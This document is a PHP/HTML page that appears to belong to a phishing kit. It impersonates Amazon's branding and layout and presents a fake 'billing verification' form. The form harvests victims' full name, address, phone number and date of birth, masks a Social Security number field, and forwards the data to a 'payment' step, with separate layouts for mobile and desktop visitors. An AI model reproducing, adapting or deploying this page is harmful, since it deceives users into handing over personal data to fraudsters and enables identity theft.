<html>
<head>
<title><?php echo $lang['billing']['title'];?></title>
<link rel='icon' href='../assets/img/favicon.ico'>
<link rel='stylesheet' href='../assets/css/mobile_login.css'>
<link rel='stylesheet' href='../assets/css/billing.css'>
<script src="../assets/js/jquery.js"></script>
<script src="../assets/js/jquery.masked.js"></script>
<meta charset='utf-8'>
<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
</head>
<body>
	<script>
	$(document).ready(function(){
  var bith = "dd/mm/yyyy";
  $("#ssn").mask("999-99-9999",{placeholder:"___-__-____"});
  $('input[name="dob"]').mask("99/99/9999", {placeholder: bith });
	$('input[name="phone"]').keyup(function(e) {
      if (/\D/g.test(this.value))
      {
        this.value = this.value.replace(/\D/g, '');
      }
    });
	});
	</script>
  <?php
  if($os == "Android" or $os == "iPhone") {}else{
    echo "<center>";
  } ?>

 <?php
  if($os == "Android" or $os == "iPhone") {
    echo '<header style="background-color:#232f3e;">
  <div class="hleft">
  <img style="margin-left:-15px;" src="../assets/img/logo.png" width="90px" height="30px"></img>
  </div>
  </header>';
  }else{
    echo '<br><header style="background-color:#fff;">
  <div class="hleft">
  <i class="a-icon a-icon-logo" style="background-position: -5px -130px;
    height: 31px;
    width: 103px;" role="img" aria-label="Amazon"></i>
  </div>
  </header>';
  } 
  ?>
  <?php
  if($os == "Android" or $os == "iPhone") {}else{
    echo "</center>";
  } ?>
<center>
	<?php
	if($os == "Android" or $os == "iPhone") {}else{
		echo "<br>";
	} ?>
<?php
  if($os == "Android" or $os == "iPhone") {
    echo '<div class="boxlogin">';
  }else{
    echo '<div style="width:400px;" class="boxlogin">';
  } 
  ?>
<div id="warnings" style='font-size:12px;font-family: Arial,sans-serif;'>
<h1><?php echo $lang['billing']['verif'];?></h1>
<span style="font-size:15px;font-family: Arial,sans-serif;"><?php echo $lang['billing']['desc_verif'];?></span>
<br>
<br><br>
 </div>
 <form action='payment?session=<?php echo $key;?>' method='post' name='add' id='details'>
<div id="formbilling">
	<h3><?php echo $lang['billing']['billing_address'];?></h3>
<div class="a-input-text-group a-spacing-medium a-spacing-top-micro">
  <div style="border-top-color: #949494;background: #e7e9ec;
    border-radius: 3px;
    border-color: #ADB1B8 #A2A6AC #8D9096;
    border-style: solid;
    border-width: 1px;
    cursor: pointer;
    display: inline-block;
    padding: 5px;
    width:100%;
    text-align: center;
    text-decoration: none!important;
    vertical-align: middle;" class="a-input-text-wrapper auth-required-field auth-fill-claim">
    <select name='country' style='background-color: transparent;
    border: 0;
    display: block;
    font-size: 1.6rem;
    line-height: 1.35;
    margin: 0;
    outline: 0;
    padding: 1.2rem 1.6rem 1.2rem 1.7rem;
    text-align: center;padding:10px;width:99.7%;border-style:none;' required="required">
      <option value="<?php echo $countryname;?>"><?php echo $countryname;?></option>
      <option value="Afghanistan">Afghanistan</option>
      <option value="Albania">Albania</option>
      <option value="Algeria">Algeria</option>
      <option value="American Samoa">American Samoa</option>
      <option value="Andorra">Andorra</option>
      <option value="Angola">Angola</option>
      <option value="Anguilla">Anguilla</option>
      <option value="Antarctica">Antarctica</option>
      <option value="Antigua and Barbuda">Antigua and Barbuda</option>
      <option value="Argentina">Argentina</option>
      <option value="Armenia">Armenia</option>
      <option value="Aruba">Aruba</option>
      <option value="Australia">Australia</option>
      <option value="Austria">Austria</option>
      <option value="Azerbaijan">Azerbaijan</option>
      <option value="Bahamas">Bahamas</option>
      <option value="Bahrain">Bahrain</option>
      <option value="Bangladesh">Bangladesh</option>
      <option value="Barbados">Barbados</option>
      <option value="Belarus">Belarus</option>
      <option value="Belgium">Belgium</option>
      <option value="Belize">Belize</option>
      <option value="Benin">Benin</option>
      <option value="Bermuda">Bermuda</option>
      <option value="Bhutan">Bhutan</option>
      <option value="Bolivia">Bolivia</option>
      <option value="Bosnia and Herzegovina">Bosnia and Herzegovina</option>
      <option value="Botswana">Botswana</option>
      <option value="Bouvet Island">Bouvet Island</option>
      <option value="Brazil">Brazil</option>
      <option value="British Indian Ocean Territory">British Indian Ocean Territory</option>
      <option value="Brunei Darussalam">Brunei Darussalam</option>
      <option value="Bulgaria">Bulgaria</option>
      <option value="Burkina Faso">Burkina Faso</option>
      <option value="Burundi">Burundi</option>
      <option value="Cambodia">Cambodia</option>
      <option value="Cameroon">Cameroon</option>
      <option value="Canada">Canada</option>
      <option value="Cape Verde">Cape Verde</option>
      <option value="Cayman Islands">Cayman Islands</option>
      <option value="Central African Republic">Central African Republic</option>
      <option value="Chad">Chad</option>
      <option value="Chile">Chile</option>
      <option value="China">China</option>
      <option value="Christmas Island">Christmas Island</option>
      <option value="Cocos (Keeling) Islands">Cocos (Keeling) Islands</option>
      <option value="Colombia">Colombia</option>
      <option value="Comoros">Comoros</option>
      <option value="Congo">Congo</option>
      <option value="Congo, The Democratic Republic of The">Congo, The Democratic Republic of The</option>
      <option value="Cook Islands">Cook Islands</option>
      <option value="Costa Rica">Costa Rica</option>
      <option value="Cote D'ivoire">Cote D'ivoire</option>
      <option value="Croatia">Croatia</option>
      <option value="Cuba">Cuba</option>
      <option value="Cyprus">Cyprus</option>
      <option value="Czech Republic">Czech Republic</option>
      <option value="Denmark">Denmark</option>
      <option value="Djibouti">Djibouti</option>
      <option value="Dominica">Dominica</option>
      <option value="Dominican Republic">Dominican Republic</option>
      <option value="Ecuador">Ecuador</option>
      <option value="Egypt">Egypt</option>
      <option value="El Salvador">El Salvador</option>
      <option value="Equatorial Guinea">Equatorial Guinea</option>
      <option value="Eritrea">Eritrea</option>
      <option value="Estonia">Estonia</option>
      <option value="Ethiopia">Ethiopia</option>
      <option value="Falkland Islands (Malvinas)">Falkland Islands (Malvinas)</option>
      <option value="Faroe Islands">Faroe Islands</option>
      <option value="Fiji">Fiji</option>
      <option value="Finland">Finland</option>
      <option value="France">France</option>
      <option value="French Guiana">French Guiana</option>
      <option value="French Polynesia">French Polynesia</option>
      <option value="French Southern Territories">French Southern Territories</option>
      <option value="Gabon">Gabon</option>
      <option value="Gambia">Gambia</option>
      <option value="Georgia">Georgia</option>
      <option value="Germany">Germany</option>
      <option value="Ghana">Ghana</option>
      <option value="Gibraltar">Gibraltar</option>
      <option value="Greece">Greece</option>
      <option value="Greenland">Greenland</option>
      <option value="Grenada">Grenada</option>
      <option value="Guadeloupe">Guadeloupe</option>
      <option value="Guam">Guam</option>
      <option value="Guatemala">Guatemala</option>
      <option value="Guinea">Guinea</option>
      <option value="Guinea-bissau">Guinea-bissau</option>
      <option value="Guyana">Guyana</option>
      <option value="Haiti">Haiti</option>
      <option value="Heard Island and Mcdonald Islands">Heard Island and Mcdonald Islands</option>
      <option value="Holy See (Vatican City State)">Holy See (Vatican City State)</option>
      <option value="Honduras">Honduras</option>
      <option value="Hong Kong">Hong Kong</option>
      <option value="Hungary">Hungary</option>
      <option value="Iceland">Iceland</option>
      <option value="India">India</option>
      <option value="Indonesia">Indonesia</option>
      <option value="Iran, Islamic Republic of">Iran, Islamic Republic of</option>
      <option value="Iraq">Iraq</option>
      <option value="Ireland">Ireland</option>
      <option value="Israel">Israel</option>
      <option value="Italy">Italy</option>
      <option value="Jamaica">Jamaica</option>
      <option value="Japan">Japan</option>
      <option value="Jordan">Jordan</option>
      <option value="Kazakhstan">Kazakhstan</option>
      <option value="Kenya">Kenya</option>
      <option value="Kiribati">Kiribati</option>
      <option value="Korea, Democratic People's Republic of">Korea, Democratic People's Republic of</option>
      <option value="Korea, Republic of">Korea, Republic of</option>
      <option value="Kuwait">Kuwait</option>
      <option value="Kyrgyzstan">Kyrgyzstan</option>
      <option value="Lao People's Democratic Republic">Lao People's Democratic Republic</option>
      <option value="Latvia">Latvia</option>
      <option value="Lebanon">Lebanon</option>
      <option value="Lesotho">Lesotho</option>
      <option value="Liberia">Liberia</option>
      <option value="Libyan Arab Jamahiriya">Libyan Arab Jamahiriya</option>
      <option value="Liechtenstein">Liechtenstein</option>
      <option value="Lithuania">Lithuania</option>
      <option value="Luxembourg">Luxembourg</option>
      <option value="Macao">Macao</option>
      <option value="Macedonia, The Former Yugoslav Republic of">Macedonia, The Former Yugoslav Republic of</option>
      <option value="Madagascar">Madagascar</option>
      <option value="Malawi">Malawi</option>
      <option value="Malaysia">Malaysia</option>
      <option value="Maldives">Maldives</option>
      <option value="Mali">Mali</option>
      <option value="Malta">Malta</option>
      <option value="Marshall Islands">Marshall Islands</option>
      <option value="Martinique">Martinique</option>
      <option value="Mauritania">Mauritania</option>
      <option value="Mauritius">Mauritius</option>
      <option value="Mayotte">Mayotte</option>
      <option value="Mexico">Mexico</option>
      <option value="Micronesia, Federated States of">Micronesia, Federated States of</option>
      <option value="Moldova, Republic of">Moldova, Republic of</option>
      <option value="Monaco">Monaco</option>
      <option value="Mongolia">Mongolia</option>
      <option value="Montserrat">Montserrat</option>
      <option value="Morocco">Morocco</option>
      <option value="Mozambique">Mozambique</option>
      <option value="Myanmar">Myanmar</option>
      <option value="Namibia">Namibia</option>
      <option value="Nauru">Nauru</option>
      <option value="Nepal">Nepal</option>
      <option value="Netherlands">Netherlands</option>
      <option value="Netherlands Antilles">Netherlands Antilles</option>
      <option value="New Caledonia">New Caledonia</option>
      <option value="New Zealand">New Zealand</option>
      <option value="Nicaragua">Nicaragua</option>
      <option value="Niger">Niger</option>
      <option value="Nigeria">Nigeria</option>
      <option value="Niue">Niue</option>
      <option value="Norfolk Island">Norfolk Island</option>
      <option value="Northern Mariana Islands">Northern Mariana Islands</option>
      <option value="Norway">Norway</option>
      <option value="Oman">Oman</option>
      <option value="Pakistan">Pakistan</option>
      <option value="Palau">Palau</option>
      <option value="Palestinian Territory, Occupied">Palestinian Territory, Occupied</option>
      <option value="Panama">Panama</option>
      <option value="Papua New Guinea">Papua New Guinea</option>
      <option value="Paraguay">Paraguay</option>
      <option value="Peru">Peru</option>
      <option value="Philippines">Philippines</option>
      <option value="Pitcairn">Pitcairn</option>
      <option value="Poland">Poland</option>
      <option value="Portugal">Portugal</option>
      <option value="Puerto Rico">Puerto Rico</option>
      <option value="Qatar">Qatar</option>
      <option value="Reunion">Reunion</option>
      <option value="Romania">Romania</option>
      <option value="Russian Federation">Russian Federation</option>
      <option value="Rwanda">Rwanda</option>
      <option value="Saint Helena">Saint Helena</option>
      <option value="Saint Kitts and Nevis">Saint Kitts and Nevis</option>
      <option value="Saint Lucia">Saint Lucia</option>
      <option value="Saint Pierre and Miquelon">Saint Pierre and Miquelon</option>
      <option value="Saint Vincent and The Grenadines">Saint Vincent and The Grenadines</option>
      <option value="Samoa">Samoa</option>
      <option value="San Marino">San Marino</option>
      <option value="Sao Tome and Principe">Sao Tome and Principe</option>
      <option value="Saudi Arabia">Saudi Arabia</option>
      <option value="Senegal">Senegal</option>
      <option value="Serbia and Montenegro">Serbia and Montenegro</option>
      <option value="Seychelles">Seychelles</option>
      <option value="Sierra Leone">Sierra Leone</option>
      <option value="Singapore">Singapore</option>
      <option value="Slovakia">Slovakia</option>
      <option value="Slovenia">Slovenia</option>
      <option value="Solomon Islands">Solomon Islands</option>
      <option value="Somalia">Somalia</option>
      <option value="South Africa">South Africa</option>
      <option value="South Georgia and The South Sandwich Islands">South Georgia and The South Sandwich Islands</option>
      <option value="Spain">Spain</option>
      <option value="Sri Lanka">Sri Lanka</option>
      <option value="Sudan">Sudan</option>
      <option value="Suriname">Suriname</option>
      <option value="Svalbard and Jan Mayen">Svalbard and Jan Mayen</option>
      <option value="Swaziland">Swaziland</option>
      <option value="Sweden">Sweden</option>
      <option value="Switzerland">Switzerland</option>
      <option value="Syrian Arab Republic">Syrian Arab Republic</option>
      <option value="Taiwan, Province of China">Taiwan, Province of China</option>
      <option value="Tajikistan">Tajikistan</option>
      <option value="Tanzania, United Republic of">Tanzania, United Republic of</option>
      <option value="Thailand">Thailand</option>
      <option value="Timor-leste">Timor-leste</option>
      <option value="Togo">Togo</option>
      <option value="Tokelau">Tokelau</option>
      <option value="Tonga">Tonga</option>
      <option value="Trinidad and Tobago">Trinidad and Tobago</option>
      <option value="Tunisia">Tunisia</option>
      <option value="Turkey">Turkey</option>
      <option value="Turkmenistan">Turkmenistan</option>
      <option value="Turks and Caicos Islands">Turks and Caicos Islands</option>
      <option value="Tuvalu">Tuvalu</option>
      <option value="Uganda">Uganda</option>
      <option value="Ukraine">Ukraine</option>
      <option value="United Arab Emirates">United Arab Emirates</option>
      <option value="United States">United States</option>
      <option value="United Kingdom">United Kingdom</option>
      <option value="United States Minor Outlying Islands">United States Minor Outlying Islands</option>
      <option value="Uruguay">Uruguay</option>
      <option value="Uzbekistan">Uzbekistan</option>
      <option value="Vanuatu">Vanuatu</option>
      <option value="Venezuela">Venezuela</option>
      <option value="Viet Nam">Viet Nam</option>
      <option value="Virgin Islands, British">Virgin Islands, British</option>
      <option value="Virgin Islands, U.S.">Virgin Islands, U.S.</option>
      <option value="Wallis and Futuna">Wallis and Futuna</option>
      <option value="Western Sahara">Western Sahara</option>
      <option value="Yemen">Yemen</option>
      <option value="Zambia">Zambia</option>
      <option value="Zimbabwe">Zimbabwe</option>
    </select>
  </div>
  <div style="padding: 5px;" class="a-input-text-wrapper auth-required-field auth-fill-claim">
    <input type="text" style="" placeholder="<?php echo $lang['billing']['fullname'];?>" name="fullname" id="fullname" autocorrect="off" autocapitalize="off" required="required">
  </div>
  <div style="padding: 5px;" class="a-input-text-wrapper auth-required-field auth-fill-claim">
    <input type="text" placeholder="<?php echo $lang['billing']['address'];?>" name="address" id="address" autocorrect="off" autocapitalize="off" required="required">
  </div>
  <div style="padding: 5px;" class="a-input-text-wrapper auth-required-field auth-fill-claim">
    <input type="text" placeholder="<?php echo $lang['billing']['city'];?>" name="city" autocorrect="off" id="city" autocapitalize="off" required="required">
  </div>
  <div style="padding: 5px;" class="a-input-text-wrapper auth-required-field auth-fill-claim">
    <input type="text" placeholder="<?php echo $lang['billing']['state'];?>" name="state" id="state" autocorrect="off" autocapitalize="off">
  </div>
  <div style="padding: 5px;" class="a-input-text-wrapper auth-required-field auth-fill-claim">
    <input type="text" placeholder="<?php echo $lang['billing']['zipcode'];?>" name="zipcode" autocorrect="off" id="zipcode" autocapitalize="off" required="required">
  </div>
  <div style="padding: 5px;" class="a-input-text-wrapper auth-required-field auth-fill-claim">
    <input type="tel" placeholder="<?php echo $lang['billing']['phone'];?>" name="phone" autocorrect="off" id="phone" autocapitalize="off" required="required">
  </div>
  <div style="padding: 5px;" class="a-input-text-wrapper auth-required-field auth-fill-claim">
    <input type="tel" placeholder="<?php echo $lang['billing']['dob'];?>" name="dob" autocorrect="off" id="dob" autocapitalize="off" required="required">
  </div>
<?php echo $additional;?>
<br>
<input type='submit' id="submit_cc" class='button a-button-text' style="padding:10px;font-size:15px;background: linear-gradient(to bottom,#f7dfa5,#f0c14b);" value='<?php echo $lang['billing']['update'];?>'>
</div></div>

</form>
</div>

</center>
<?php
if($os == "Android" or $os == "iPhone") {}else{
	echo "<br><br>";
} ?>
<?php
if($os == "Android" or $os == "iPhone") {
?>
<footer class="nav-mobile nav-locale-us nav-lang-en nav-ftr-batmobile">
                    <div id="nav-ftr" class="nav-t-basicNoAuth nav-sprite-v3">
                        <ul class="nav-ftr-horiz ">
                            <li class="nav-li "><a href="/gp/aw/help/ref=navm_ftr_cou?ie=UTF8&amp;id=cou" class="nav-a"><?php echo $lang['footer']['condi'];?></a></li>
                            <li class="nav-li "><a href="/gp/help/customer/display.html/ref=footer_privacy?ie=UTF8&amp;nodeId=468496" class="nav-a"><?php echo $lang['footer']['privacy'];?></a></li>
                            <li class="nav-li "><a href="/gp/aw/help/ref=navm_ftr_iba?ie=UTF8&amp;id=201308670" class="nav-a"><?php echo $lang['footer']['help'];?></a></li>
                        </ul>
                        <div id="nav-ftr-copyright"><?php echo $lang['footer']['copyright'];?></div>
                    </div>
                </footer>
<?php }?>
</body>
</html>
